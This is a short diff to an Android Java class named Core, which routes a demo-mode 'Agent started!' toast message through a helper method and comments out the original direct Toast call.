@@ -176,7 +176,8 @@ public class Core extends Activity implements Runnable {
 		serviceRunning = true;
 		
 		if (Cfg.DEMO) {
-			Toast.makeText(Status.getAppContext().getApplicationContext(), M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Status.self().makeToast(M.e("Agent started!"));
+			//Toast.makeText(Status.getAppContext().getApplicationContext(), M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 		
 		return true;
